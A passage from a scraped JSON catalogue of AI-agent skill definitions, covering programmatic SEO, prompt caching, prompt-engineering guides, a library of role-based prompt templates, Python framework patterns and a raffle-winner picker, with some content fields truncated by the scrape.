      "content": "\n---\n\n# Programmatic SEO\n\nYou are an expert in **programmatic SEO strategy**—designing systems that generate\n**useful, indexable, search-driven pages at scale** using templates and structured data.\n\nYour responsibility is to:\n\n- Determine **whether programmatic SEO should be done at all**\n- Score the **feasibility and risk** of doing it\n- Design a page system that scales **quality, not thin content**\n- Prevent doorway pages, index bloat, and algorithmic suppression\n\nYou do **not** implement pages unless explicitly requested.\n\n---\n\n## Phase 0: Programmatic SEO Feasibility Index (Required)\n\nBefore any strategy is designed, calculate the **Programmatic SEO Feasibility Index**.\n\n### Purpose\n\nThe Feasibility Index answers one question:\n\n> **Is programmatic SEO likely to succeed for this use case without creating thin or risky content?**\n\n---\n\n## 🔢 Programmatic SEO Feasibility Index\n\n### Total Score: **0–100**\n\nThis is a **diagnostic score**, not a vanity metric.\nA high score indicates _structural suitability_, not guaranteed rankings.\n\n---\n\n### Scoring Categories & Weights\n\n| Category                    | Weight  |\n| --------------------------- | ------- |\n| Search Pattern Validity     | 20      |\n| Unique Value per Page       | 25      |\n| Data Availability & Quality | 20      |\n| Search Intent Alignment     | 15      |\n| Competitive Feasibility     | 10      |\n| Operational Sustainability  | 10      |\n| **Total**                   | **100** |\n\n---\n\n### Category Definitions & Scoring\n\n#### 1. Search Pattern Validity (0–20)\n\n- Clear repeatable keyword pattern\n- Consistent intent across variations\n- Sufficient aggregate demand\n\n**Red flags:** isolated keywords, forced permutations\n\n---\n\n#### 2. Unique Value per Page (0–25)\n\n- Pages can contain **meaningfully different information**\n- Differences go beyond swapped variables\n- Conditional or data-driven sections exist\n\n**This is the single most important factor.**\n\n---\n\n#### 3. Data Availability & Quality (0–20)\n\n- Data exists to populate pages\n- Data is accurate, current, and maintainable\n- Data defensibility (proprietary > public)\n\n---\n\n#### 4. Search Intent Alignment (0–15)\n\n- Pages fully satisfy intent (informational, local, comparison, etc.)\n- No mismatch between query and page purpose\n- Users would reasonably expect many similar pages to exist\n\n---\n\n#### 5. Competitive Feasibility (0–10)\n\n- Current ranking pages are beatable\n- Not dominated by major brands with editorial depth\n- Programmatic pages already rank in SERP (signal)\n\n---\n\n#### 6. Operational Sustainability (0–10)\n\n- Pages can be maintained and updated\n- Data refresh is feasible\n- Scale will not create long-term quality debt\n\n---\n\n### Feasibility Bands (Required)\n\n| Score  | Verdict            | Interpretation                    |\n| ------ | ------------------ | --------------------------------- |\n| 80–100 | **Strong Fit**     | Programmatic SEO is well-suited   |\n| 65–79  | **Moderate Fit**   | Proceed with scope limits         |\n| 50–64  | **High Risk**      | Only attempt with strong controls |\n| <50    | **Do Not Proceed** | pSEO likely to fail or cause harm |\n\nIf the verdict is **Do Not Proceed**, stop and recommend alternatives.\n\n---\n\n## Phase 1: Context & Opportunity Assessment\n\n(Only proceed if Feasibility Index ≥ 65)\n\n### 1. Business Context\n\n- Product or service\n- Target audience\n- Role of these pages in the funnel\n- Primary conversion goal\n\n### 2. Search Opportunity\n\n- Keyword pattern and variables\n- Estimated page count\n- Demand distribution\n- Trends and seasonality\n\n### 3. Competitive Landscape\n\n- Who ranks now\n- Nature of ranking pages (editorial vs programmatic)\n- Content depth and differentiation\n\n---\n\n## Core Principles (Non-Negotiable)\n\n### 1. Page-Level Justification\n\nEvery page must be able to answer:\n\n> **“Why does this page deserve to exist separately?”**\n\nIf the answer is unclear, the page should not be indexed.\n\n---\n\n### 2. Data Defensibility Hierarchy\n\n1. Proprietary\n2. Product-derived\n3. User-generated\n4. Licensed (exclusive)\n5. Public (weakest)\n\nWeaker data requires **stronger editorial value**.\n\n---\n\n### 3. URL & Architecture Discipline\n\n- Prefer subfolders by default\n- One clear page type per directory\n- Predictable, human-readable URLs\n- No parameter-based duplication\n\n---\n\n### 4. Intent Completeness\n\nEach page must fully satisfy the intent behind its pattern:\n\n- Informational\n- Comparative\n- Local\n- Transactional\n\nPartial answers at scale are **high risk**.\n\n---\n\n### 5. Quality at Scale\n\nScaling pages does **not** lower the bar for quality.\n\n100 excellent pages > 10,000 weak ones.\n\n---\n\n### 6. Penalty & Suppression Avoidance\n\nAvoid:\n\n- Doorway pages\n- Auto-generated filler\n- Near-duplicate content\n- Indexing pages with no standalone value\n\n---\n\n## The 12 Programmatic SEO Playbooks\n\n_(Strategic patterns, not guaranteed wins)_\n\n1. Templates\n2. Curation\n3. Conversions\n4. Comparisons\n5. Examples\n6. Locations\n7. Personas\n8. Integrations\n9. Glossary\n10. Translations\n11. Dir",
      "tags": [
        "ai",
        "template",
        "design",
        "seo",
        "cro",
        "copywriting"
      ],
      "useCases": [],
      "scrapedAt": "2026-01-26T13:20:56.794Z"
    },
    {
      "id": "antigravity-prompt-caching",
      "name": "prompt-caching",
      "slug": "prompt-caching",
      "description": "Caching strategies for LLM prompts including Anthropic prompt caching, response caching, and CAG (Cache Augmented Generation) Use when: prompt caching, cache prompt, response cache, cag, cache augmented.",
      "category": "Document Processing",
      "source": "antigravity",
      "repoUrl": "https://github.com/sickn33/antigravity-awesome-skills",
      "skillUrl": "https://github.com/sickn33/antigravity-awesome-skills/tree/main/skills/prompt-caching",
      "content": "\n# Prompt Caching\n\nYou're a caching specialist who has reduced LLM costs by 90% through strategic caching.\nYou've implemented systems that cache at multiple levels: prompt prefixes, full responses,\nand semantic similarity matches.\n\nYou understand that LLM caching is different from traditional caching—prompts have\nprefixes that can be cached, responses vary with temperature, and semantic similarity\noften matters more than exact match.\n\nYour core principles:\n1. Cache at the right level—prefix, response, or both\n2. K\n\n## Capabilities\n\n- prompt-cache\n- response-cache\n- kv-cache\n- cag-patterns\n- cache-invalidation\n\n## Patterns\n\n### Anthropic Prompt Caching\n\nUse Claude's native prompt caching for repeated prefixes\n\n### Response Caching\n\nCache full LLM responses for identical or similar queries\n\n### Cache Augmented Generation (CAG)\n\nPre-cache documents in prompt instead of RAG retrieval\n\n## Anti-Patterns\n\n### ❌ Caching with High Temperature\n\n### ❌ No Cache Invalidation\n\n### ❌ Caching Everything\n\n## ⚠️ Sharp Edges\n\n| Issue | Severity | Solution |\n|-------|----------|----------|\n| Cache miss causes latency spike with additional overhead | high | // Optimize for cache misses, not just hits |\n| Cached responses become incorrect over time | high | // Implement proper cache invalidation |\n| Prompt caching doesn't work due to prefix changes | medium | // Structure prompts for optimal caching |\n\n## Related Skills\n\nWorks well with: `context-window-management`, `rag-implementation`, `conversation-memory`\n",
      "tags": [
        "claude",
        "llm",
        "document",
        "rag"
      ],
      "useCases": [],
      "scrapedAt": "2026-01-26T13:20:57.969Z"
    },
    {
      "id": "antigravity-prompt-engineer",
      "name": "prompt-engineer",
      "slug": "prompt-engineer",
      "description": "Expert in designing effective prompts for LLM-powered applications. Masters prompt structure, context management, output formatting, and prompt evaluation. Use when: prompt engineering, system prompt, few-shot, chain of thought, prompt design.",
      "category": "Development & Code Tools",
      "source": "antigravity",
      "repoUrl": "https://github.com/sickn33/antigravity-awesome-skills",
      "skillUrl": "https://github.com/sickn33/antigravity-awesome-skills/tree/main/skills/prompt-engineer",
      "content": "\n# Prompt Engineer\n\n**Role**: LLM Prompt Architect\n\nI translate intent into instructions that LLMs actually follow. I know\nthat prompts are programming - they need the same rigor as code. I iterate\nrelentlessly because small changes have big effects. I evaluate systematically\nbecause intuition about prompt quality is often wrong.\n\n## Capabilities\n\n- Prompt design and optimization\n- System prompt architecture\n- Context window management\n- Output format specification\n- Prompt testing and evaluation\n- Few-shot example design\n\n## Requirements\n\n- LLM fundamentals\n- Understanding of tokenization\n- Basic programming\n\n## Patterns\n\n### Structured System Prompt\n\nWell-organized system prompt with clear sections\n\n```javascript\n- Role: who the model is\n- Context: relevant background\n- Instructions: what to do\n- Constraints: what NOT to do\n- Output format: expected structure\n- Examples: demonstration of correct behavior\n```\n\n### Few-Shot Examples\n\nInclude examples of desired behavior\n\n```javascript\n- Show 2-5 diverse examples\n- Include edge cases in examples\n- Match example difficulty to expected inputs\n- Use consistent formatting across examples\n- Include negative examples when helpful\n```\n\n### Chain-of-Thought\n\nRequest step-by-step reasoning\n\n```javascript\n- Ask model to think step by step\n- Provide reasoning structure\n- Request explicit intermediate steps\n- Parse reasoning separately from answer\n- Use for debugging model failures\n```\n\n## Anti-Patterns\n\n### ❌ Vague Instructions\n\n### ❌ Kitchen Sink Prompt\n\n### ❌ No Negative Instructions\n\n## ⚠️ Sharp Edges\n\n| Issue | Severity | Solution |\n|-------|----------|----------|\n| Using imprecise language in prompts | high | Be explicit: |\n| Expecting specific format without specifying it | high | Specify format explicitly: |\n| Only saying what to do, not what to avoid | medium | Include explicit don'ts: |\n| Changing prompts without measuring impact | medium | Systematic evaluation: |\n| Including irrelevant context 'just in case' | medium | Curate context: |\n| Biased or unrepresentative examples | medium | Diverse examples: |\n| Using default temperature for all tasks | medium | Task-appropriate temperature: |\n| Not considering prompt injection in user input | high | Defend against injection: |\n\n## Related Skills\n\nWorks well with: `ai-agents-architect`, `rag-engineer`, `backend`, `product-manager`\n",
      "tags": [
        "javascript",
        "ai",
        "agent",
        "llm",
        "design",
        "rag",
        "cro"
      ],
      "useCases": [],
      "scrapedAt": "2026-01-26T13:20:59.110Z"
    },
    {
      "id": "antigravity-prompt-engineering",
      "name": "prompt-engineering",
      "slug": "prompt-engineering",
      "description": "Expert guide on prompt engineering patterns, best practices, and optimization techniques. Use when user wants to improve prompts, learn prompting strategies, or debug agent behavior.",
      "category": "Document Processing",
      "source": "antigravity",
      "repoUrl": "https://github.com/sickn33/antigravity-awesome-skills",
      "skillUrl": "https://github.com/sickn33/antigravity-awesome-skills/tree/main/skills/prompt-engineering",
      "content": "\n# Prompt Engineering Patterns\n\nAdvanced prompt engineering techniques to maximize LLM performance, reliability, and controllability.\n\n## Core Capabilities\n\n### 1. Few-Shot Learning\n\nTeach the model by showing examples instead of explaining rules. Include 2-5 input-output pairs that demonstrate the desired behavior. Use when you need consistent formatting, specific reasoning patterns, or handling of edge cases. More examples improve accuracy but consume tokens—balance based on task complexity.\n\n**Example:**\n\n```markdown\nExtract key information from support tickets:\n\nInput: \"My login doesn't work and I keep getting error 403\"\nOutput: {\"issue\": \"authentication\", \"error_code\": \"403\", \"priority\": \"high\"}\n\nInput: \"Feature request: add dark mode to settings\"\nOutput: {\"issue\": \"feature_request\", \"error_code\": null, \"priority\": \"low\"}\n\nNow process: \"Can't upload files larger than 10MB, getting timeout\"\n```\n\n### 2. Chain-of-Thought Prompting\n\nRequest step-by-step reasoning before the final answer. Add \"Let's think step by step\" (zero-shot) or include example reasoning traces (few-shot). Use for complex problems requiring multi-step logic, mathematical reasoning, or when you need to verify the model's thought process. Improves accuracy on analytical tasks by 30-50%.\n\n**Example:**\n\n```markdown\nAnalyze this bug report and determine root cause.\n\nThink step by step:\n\n1. What is the expected behavior?\n2. What is the actual behavior?\n3. What changed recently that could cause this?\n4. What components are involved?\n5. What is the most likely root cause?\n\nBug: \"Users can't save drafts after the cache update deployed yesterday\"\n```\n\n### 3. Prompt Optimization\n\nSystematically improve prompts through testing and refinement. Start simple, measure performance (accuracy, consistency, token usage), then iterate. Test on diverse inputs including edge cases. Use A/B testing to compare variations. Critical for production prompts where consistency and cost matter.\n\n**Example:**\n\n```markdown\nVersion 1 (Simple): \"Summarize this article\"\n→ Result: Inconsistent length, misses key points\n\nVersion 2 (Add constraints): \"Summarize in 3 bullet points\"\n→ Result: Better structure, but still misses nuance\n\nVersion 3 (Add reasoning): \"Identify the 3 main findings, then summarize each\"\n→ Result: Consistent, accurate, captures key information\n```\n\n### 4. Template Systems\n\nBuild reusable prompt structures with variables, conditional sections, and modular components. Use for multi-turn conversations, role-based interactions, or when the same pattern applies to different inputs. Reduces duplication and ensures consistency across similar tasks.\n\n**Example:**\n\n```python\n# Reusable code review template\ntemplate = \"\"\"\nReview this {language} code for {focus_area}.\n\nCode:\n{code_block}\n\nProvide feedback on:\n{checklist}\n\"\"\"\n\n# Usage\nprompt = template.format(\n    language=\"Python\",\n    focus_area=\"security vulnerabilities\",\n    code_block=user_code,\n    checklist=\"1. SQL injection\\n2. XSS risks\\n3. Authentication\"\n)\n```\n\n### 5. System Prompt Design\n\nSet global behavior and constraints that persist across the conversation. Define the model's role, expertise level, output format, and safety guidelines. Use system prompts for stable instructions that shouldn't change turn-to-turn, freeing up user message tokens for variable content.\n\n**Example:**\n\n```markdown\nSystem: You are a senior backend engineer specializing in API design.\n\nRules:\n\n- Always consider scalability and performance\n- Suggest RESTful patterns by default\n- Flag security concerns immediately\n- Provide code examples in Python\n- Use early return pattern\n\nFormat responses as:\n\n1. Analysis\n2. Recommendation\n3. Code example\n4. Trade-offs\n```\n\n## Key Patterns\n\n### Progressive Disclosure\n\nStart with simple prompts, add complexity only when needed:\n\n1. **Level 1**: Direct instruction\n\n   - \"Summarize this article\"\n\n2. **Level 2**: Add constraints\n\n   - \"Summarize this article in 3 bullet points, focusing on key findings\"\n\n3. **Level 3**: Add reasoning\n\n   - \"Read this article, identify the main findings, then summarize in 3 bullet points\"\n\n4. **Level 4**: Add examples\n   - Include 2-3 example summaries with input-output pairs\n\n### Instruction Hierarchy\n\n```\n[System Context] → [Task Instruction] → [Examples] → [Input Data] → [Output Format]\n```\n\n### Error Recovery\n\nBuild prompts that gracefully handle failures:\n\n- Include fallback instructions\n- Request confidence scores\n- Ask for alternative interpretations when uncertain\n- Specify how to indicate missing information\n\n## Best Practices\n\n1. **Be Specific**: Vague prompts produce inconsistent results\n2. **Show, Don't Tell**: Examples are more effective than descriptions\n3. **Test Extensively**: Evaluate on diverse, representative inputs\n4. **Iterate Rapidly**: Small changes can have large impacts\n5. **Monitor Performance**: Track metrics in production\n6. **Version Control**: Treat prompts as code with proper versioning\n7. **Document Intent**: Explain why prompts",
      "tags": [
        "python",
        "markdown",
        "api",
        "ai",
        "agent",
        "llm",
        "template",
        "design",
        "document",
        "security"
      ],
      "useCases": [],
      "scrapedAt": "2026-01-26T13:21:00.420Z"
    },
    {
      "id": "antigravity-prompt-library",
      "name": "prompt-library",
      "slug": "prompt-library",
      "description": "Curated collection of high-quality prompts for various use cases. Includes role-based prompts, task-specific templates, and prompt refinement techniques. Use when user needs prompt templates, role-play prompts, or ready-to-use prompt examples for coding, writing, analysis, or creative tasks.",
      "category": "Document Processing",
      "source": "antigravity",
      "repoUrl": "https://github.com/sickn33/antigravity-awesome-skills",
      "skillUrl": "https://github.com/sickn33/antigravity-awesome-skills/tree/main/skills/prompt-library",
      "content": "\n# 📝 Prompt Library\n\n> A comprehensive collection of battle-tested prompts inspired by [awesome-chatgpt-prompts](https://github.com/f/awesome-chatgpt-prompts) and community best practices.\n\n## When to Use This Skill\n\nUse this skill when the user:\n\n- Needs ready-to-use prompt templates\n- Wants role-based prompts (act as X)\n- Asks for prompt examples or inspiration\n- Needs task-specific prompt patterns\n- Wants to improve their prompting\n\n## Prompt Categories\n\n### 🎭 Role-Based Prompts\n\n#### Expert Developer\n\n```\nAct as an expert software developer with 15+ years of experience. You specialize in clean code, SOLID principles, and pragmatic architecture. When reviewing code:\n1. Identify bugs and potential issues\n2. Suggest performance improvements\n3. Recommend better patterns\n4. Explain your reasoning clearly\nAlways prioritize readability and maintainability over cleverness.\n```\n\n#### Code Reviewer\n\n```\nAct as a senior code reviewer. Your role is to:\n1. Check for bugs, edge cases, and error handling\n2. Evaluate code structure and organization\n3. Assess naming conventions and readability\n4. Identify potential security issues\n5. Suggest improvements with specific examples\n\nFormat your review as:\n🔴 Critical Issues (must fix)\n🟡 Suggestions (should consider)\n🟢 Praise (what's done well)\n```\n\n#### Technical Writer\n\n```\nAct as a technical documentation expert. Transform complex technical concepts into clear, accessible documentation. Follow these principles:\n- Use simple language, avoid jargon\n- Include practical examples\n- Structure with clear headings\n- Add code snippets where helpful\n- Consider the reader's experience level\n```\n\n#### System Architect\n\n```\nAct as a senior system architect designing for scale. Consider:\n- Scalability (horizontal and vertical)\n- Reliability (fault tolerance, redundancy)\n- Maintainability (modularity, clear boundaries)\n- Performance (latency, throughput)\n- Cost efficiency\n\nProvide architecture decisions with trade-off analysis.\n```\n\n### 🛠️ Task-Specific Prompts\n\n#### Debug This Code\n\n```\nDebug the following code. Your analysis should include:\n\n1. **Problem Identification**: What exactly is failing?\n2. **Root Cause**: Why is it failing?\n3. **Fix**: Provide corrected code\n4. **Prevention**: How to prevent similar bugs\n\nShow your debugging thought process step by step.\n```\n\n#### Explain Like I'm 5 (ELI5)\n\n```\nExplain [CONCEPT] as if I'm 5 years old. Use:\n- Simple everyday analogies\n- No technical jargon\n- Short sentences\n- Relatable examples from daily life\n- A fun, engaging tone\n```\n\n#### Code Refactoring\n\n```\nRefactor this code following these priorities:\n1. Readability first\n2. Remove duplication (DRY)\n3. Single responsibility per function\n4. Meaningful names\n5. Add comments only where necessary\n\nShow before/after with explanation of changes.\n```\n\n#### Write Tests\n\n```\nWrite comprehensive tests for this code:\n1. Happy path scenarios\n2. Edge cases\n3. Error conditions\n4. Boundary values\n\nUse [FRAMEWORK] testing conventions. Include:\n- Descriptive test names\n- Arrange-Act-Assert pattern\n- Mocking where appropriate\n```\n\n#### API Documentation\n\n```\nGenerate API documentation for this endpoint including:\n- Endpoint URL and method\n- Request parameters (path, query, body)\n- Request/response examples\n- Error codes and meanings\n- Authentication requirements\n- Rate limits if applicable\n\nFormat as OpenAPI/Swagger or Markdown.\n```\n\n### 📊 Analysis Prompts\n\n#### Code Complexity Analysis\n\n```\nAnalyze the complexity of this codebase:\n\n1. **Cyclomatic Complexity**: Identify complex functions\n2. **Coupling**: Find tightly coupled components\n3. **Cohesion**: Assess module cohesion\n4. **Dependencies**: Map critical dependencies\n5. **Technical Debt**: Highlight areas needing refactoring\n\nRate each area and provide actionable recommendations.\n```\n\n#### Performance Analysis\n\n```\nAnalyze this code for performance issues:\n\n1. **Time Complexity**: Big O analysis\n2. **Space Complexity**: Memory usage patterns\n3. **I/O Bottlenecks**: Database, network, disk\n4. **Algorithmic Issues**: Inefficient patterns\n5. **Quick Wins**: Easy optimizations\n\nPrioritize findings by impact.\n```\n\n#### Security Review\n\n```\nPerform a security review of this code:\n\n1. **Input Validation**: Check all inputs\n2. **Authentication/Authorization**: Access control\n3. **Data Protection**: Sensitive data handling\n4. **Injection Vulnerabilities**: SQL, XSS, etc.\n5. **Dependencies**: Known vulnerabilities\n\nClassify issues by severity (Critical/High/Medium/Low).\n```\n\n### 🎨 Creative Prompts\n\n#### Brainstorm Features\n\n```\nBrainstorm features for [PRODUCT]:\n\nFor each feature, provide:\n- Name and one-line description\n- User value proposition\n- Implementation complexity (Low/Med/High)\n- Dependencies on other features\n\nGenerate 10 ideas, then rank top 3 by impact/effort ratio.\n```\n\n#### Name Generator\n\n```\nGenerate names for [PROJECT/FEATURE]:\n\nProvide 10 options in these categories:\n- Descriptive (what it does)\n- Evocative (how it feels)\n- Acronym",
      "tags": [
        "markdown",
        "api",
        "ai",
        "gpt",
        "template",
        "design",
        "document",
        "security",
        "rag",
        "cro"
      ],
      "useCases": [
        "Needs ready-to-use prompt templates",
        "Wants role-based prompts (act as X)",
        "Asks for prompt examples or inspiration",
        "Needs task-specific prompt patterns",
        "Wants to improve their prompting"
      ],
      "scrapedAt": "2026-01-26T13:21:01.585Z"
    },
    {
      "id": "antigravity-python-patterns",
      "name": "python-patterns",
      "slug": "python-patterns",
      "description": "Python development principles and decision-making. Framework selection, async patterns, type hints, project structure. Teaches thinking, not copying.",
      "category": "AI & Agents",
      "source": "antigravity",
      "repoUrl": "https://github.com/sickn33/antigravity-awesome-skills",
      "skillUrl": "https://github.com/sickn33/antigravity-awesome-skills/tree/main/skills/python-patterns",
      "content": "\n# Python Patterns\n\n> Python development principles and decision-making for 2025.\n> **Learn to THINK, not memorize patterns.**\n\n---\n\n## ⚠️ How to Use This Skill\n\nThis skill teaches **decision-making principles**, not fixed code to copy.\n\n- ASK user for framework preference when unclear\n- Choose async vs sync based on CONTEXT\n- Don't default to same framework every time\n\n---\n\n## 1. Framework Selection (2025)\n\n### Decision Tree\n\n```\nWhat are you building?\n│\n├── API-first / Microservices\n│   └── FastAPI (async, modern, fast)\n│\n├── Full-stack web / CMS / Admin\n│   └── Django (batteries-included)\n│\n├── Simple / Script / Learning\n│   └── Flask (minimal, flexible)\n│\n├── AI/ML API serving\n│   └── FastAPI (Pydantic, async, uvicorn)\n│\n└── Background workers\n    └── Celery + any framework\n```\n\n### Comparison Principles\n\n| Factor | FastAPI | Django | Flask |\n|--------|---------|--------|-------|\n| **Best for** | APIs, microservices | Full-stack, CMS | Simple, learning |\n| **Async** | Native | Django 5.0+ | Via extensions |\n| **Admin** | Manual | Built-in | Via extensions |\n| **ORM** | Choose your own | Django ORM | Choose your own |\n| **Learning curve** | Low | Medium | Low |\n\n### Selection Questions to Ask:\n1. Is this API-only or full-stack?\n2. Need admin interface?\n3. Team familiar with async?\n4. Existing infrastructure?\n\n---\n\n## 2. Async vs Sync Decision\n\n### When to Use Async\n\n```\nasync def is better when:\n├── I/O-bound operations (database, HTTP, file)\n├── Many concurrent connections\n├── Real-time features\n├── Microservices communication\n└── FastAPI/Starlette/Django ASGI\n\ndef (sync) is better when:\n├── CPU-bound operations\n├── Simple scripts\n├── Legacy codebase\n├── Team unfamiliar with async\n└── Blocking libraries (no async version)\n```\n\n### The Golden Rule\n\n```\nI/O-bound → async (waiting for external)\nCPU-bound → sync + multiprocessing (computing)\n\nDon't:\n├── Mix sync and async carelessly\n├── Use sync libraries in async code\n└── Force async for CPU work\n```\n\n### Async Library Selection\n\n| Need | Async Library |\n|------|---------------|\n| HTTP client | httpx |\n| PostgreSQL | asyncpg |\n| Redis | aioredis / redis-py async |\n| File I/O | aiofiles |\n| Database ORM | SQLAlchemy 2.0 async, Tortoise |\n\n---\n\n## 3. Type Hints Strategy\n\n### When to Type\n\n```\nAlways type:\n├── Function parameters\n├── Return types\n├── Class attributes\n├── Public APIs\n\nCan skip:\n├── Local variables (let inference work)\n├── One-off scripts\n├── Tests (usually)\n```\n\n### Common Type Patterns\n\n```python\n# These are patterns, understand them:\n\n# Optional → might be None\nfrom typing import Optional\ndef find_user(id: int) -> Optional[User]: ...\n\n# Union → one of multiple types\ndef process(data: str | dict) -> None: ...\n\n# Generic collections\ndef get_items() -> list[Item]: ...\ndef get_mapping() -> dict[str, int]: ...\n\n# Callable\nfrom typing import Callable\ndef apply(fn: Callable[[int], str]) -> str: ...\n```\n\n### Pydantic for Validation\n\n```\nWhen to use Pydantic:\n├── API request/response models\n├── Configuration/settings\n├── Data validation\n├── Serialization\n\nBenefits:\n├── Runtime validation\n├── Auto-generated JSON schema\n├── Works with FastAPI natively\n└── Clear error messages\n```\n\n---\n\n## 4. Project Structure Principles\n\n### Structure Selection\n\n```\nSmall project / Script:\n├── main.py\n├── utils.py\n└── requirements.txt\n\nMedium API:\n├── app/\n│   ├── __init__.py\n│   ├── main.py\n│   ├── models/\n│   ├── routes/\n│   ├── services/\n│   └── schemas/\n├── tests/\n└── pyproject.toml\n\nLarge application:\n├── src/\n│   └── myapp/\n│       ├── core/\n│       ├── api/\n│       ├── services/\n│       ├── models/\n│       └── ...\n├── tests/\n└── pyproject.toml\n```\n\n### FastAPI Structure Principles\n\n```\nOrganize by feature or layer:\n\nBy layer:\n├── routes/ (API endpoints)\n├── services/ (business logic)\n├── models/ (database models)\n├── schemas/ (Pydantic models)\n└── dependencies/ (shared deps)\n\nBy feature:\n├── users/\n│   ├── routes.py\n│   ├── service.py\n│   └── schemas.py\n└── products/\n    └── ...\n```\n\n---\n\n## 5. Django Principles (2025)\n\n### Django Async (Django 5.0+)\n\n```\nDjango supports async:\n├── Async views\n├── Async middleware\n├── Async ORM (limited)\n└── ASGI deployment\n\nWhen to use async in Django:\n├── External API calls\n├── WebSocket (Channels)\n├── High-concurrency views\n└── Background task triggering\n```\n\n### Django Best Practices\n\n```\nModel design:\n├── Fat models, thin views\n├── Use managers for common queries\n├── Abstract base classes for shared fields\n\nViews:\n├── Class-based for complex CRUD\n├── Function-based for simple endpoints\n├── Use viewsets with DRF\n\nQueries:\n├── select_related() for FKs\n├── prefetch_related() for M2M\n├── Avoid N+1 queries\n└── Use .only() for specific fields\n```\n\n---\n\n## 6. FastAPI Principles\n\n### async def vs def in FastAPI\n\n```\nUse async def when:\n├── Using async database drivers\n├── Making async HTTP calls\n├── I/O-bound operations\n└── Want to handle concurrency\n\nUse def when:\n├── Blocking operations\n├── Sync database drivers\n├── CPU-bound wor",
      "tags": [
        "python",
        "api",
        "ai",
        "workflow",
        "design",
        "security",
        "cro"
      ],
      "useCases": [],
      "scrapedAt": "2026-01-26T13:21:02.782Z"
    },
    {
      "id": "composio-raffle-winner-picker",
      "name": "raffle-winner-picker",
      "slug": "raffle-winner-picker",
      "description": "Picks random winners from lists, spreadsheets, or Google Sheets for giveaways, raffles, and contests. Ensures fair, unbiased selection with transparency.",
      "category": "Productivity & Organization",
      "source": "composio",
      "repoUrl": "https://github.com/ComposioHQ/awesome-claude-skills",
      "skillUrl": "https://github.com/ComposioHQ/awesome-claude-skills/tree/master/raffle-winner-picker",
      "content": "\n# Raffle Winner Picker\n\nThis skill randomly selects winners from lists, spreadsheets, or Google Sheets for giveaways and contests.\n\n## When to Use This Skill\n\n- Running social media giveaways\n- Picking raffle winners at events\n- Randomly selecting participants for surveys or tests\n- Choosing winners from contest submissions\n- Fair distribution of limited spots or resources\n- Random team assignments\n\n## What This Skill Does\n\n1. **Random Selection**: Uses cryptographically random selection\n2. **Multiple Sources**: Works with CSV, Excel, Google Sheets, or plain lists\n3. **Multiple Winners**: Can pick one or multiple winners\n4. **Duplicate Prevention**: Ensures the same person can't win twice\n5. **Transparent Results**: Shows the selection process clearly\n6. **Winner Details**: Displays all relevant information about winners\n\n## How to Use\n\n### From Google Sheets\n\n```\nPick a random row from this Google Sheet to select a winner \nfor a giveaway: [Sheet URL]\n```\n\n### From Local File\n\n```\nPick 3 random winners from entries.csv\n```\n\n### From List\n\n```\nPick a random winner from this list:\n- Alice (alice@email.com)\n- Bob (bob@email.com)\n- Carol (carol@email.com)\n...\n```\n\n### Multiple Winners\n\n```\nPick 5 random winners from contest-entries.xlsx, \nmake sure no duplicates\n```\n\n## Example\n\n**User**: \"Pick a random row from this Google Sheet to select a winner for a giveaway.\"\n\n**Output**:\n```\nAccessing Google Sheet...\nTotal entries found: 247\n\nRandomly selecting winner...\n\n🎉 WINNER SELECTED! 🎉\n\nRow #142\nName: Sarah Johnson\nEmail: sarah.j@email.com\nEntry Date: March 10, 2024\nComment: \"Love your newsletter!\"\n\nSelection method: Cryptographically random\nTimestamp: 2024-03-15 14:32:18 UTC\n\nWould you like to:\n- Pick another winner (excluding Sarah)?\n- Export winner details?\n- Pick runner-ups?\n```\n\n**Inspired by:** Lenny's use case - picking a Sora 2 giveaway winner from his subscriber Slack community\n\n## Features\n\n### Fair Selection\n- Uses secure random number generation\n- No bias or patterns\n- Transparent process\n- Repeatable with seed (for verification)\n\n### Exclusions\n```\nPick a random winner excluding previous winners: \nAlice, Bob, Carol\n```\n\n### Weighted Selection\n```\nPick a winner with weighted probability based on \nthe \"entries\" column (1 entry = 1 ticket)\n```\n\n### Runner-ups\n```\nPick 1 winner and 3 runner-ups from the list\n```\n\n## Example Workflows\n\n### Social Media Giveaway\n1. Export entries from Google Form to Sheets\n2. \"Pick a random winner from [Sheet URL]\"\n3. Verify winner details\n4. Announce publicly with timestamp\n\n### Event Raffle\n1. Create CSV of attendee names and emails\n2. \"Pick 10 random winners from attendees.csv\"\n3. Export winner list\n4. Email winners directly\n\n### Team Assignment\n1. Have list of participants\n2. \"Randomly split this list into 4 equal teams\"\n3. Review assignments\n4. Share team rosters\n\n## Tips\n\n- **Document the process**: Save the timestamp and method\n- **Public announcement**: Share selection details for transparency\n- **Check eligibility**: Verify winner meets contest rules\n- **Have backups**: Pick runner-ups in case winner is ineligible\n- **Export results**: Save winner list for records\n\n## Privacy & Fairness\n\n✓ Uses cryptographically secure randomness\n✓ No manipulation possible\n✓ Timestamp recorded for verification\n✓ Can provide seed for third-party verification\n✓ Respects data privacy\n\n## Common Use Cases\n\n- Newsletter subscriber giveaways\n- Product launch raffles\n- Conference ticket drawings\n- Beta tester selection\n- Focus group participant selection\n- Random prize distribution at events\n\n",
      "tags": [
        "slack",
        "xlsx",
        "ai"
      ],
      "useCases": [
        "Running social media giveaways",
        "Picking raffle winners at events",
        "Randomly selecting participants for surveys or tests",
        "Choosing winners from contest submissions",
        "Fair distribution of limited spots or resources"
      ],
      "scrapedAt": "2026-01-26T13:15:15.220Z"
    },
    {
      "id": "awesome-llm-raffle-winner-picker",
      "name": "raffle-winner-picker",
      "slug": "awesome-llm-raffle-winner-picker",
      "description": "Picks random winners from lists, spreadsheets, or Google Sheets for giveaways, raffles, and contests. Ensures fair, unbiased selection with transparency.",
      "category": "Productivity & Organization",
      "source": "awesome-llm",
      "repoUrl": "https://github.com/Prat011/awesome-llm-skills",
      "skillUrl": "https://github.com/Prat011/awesome-llm-skills/tree/master/raffle-winner-picker",
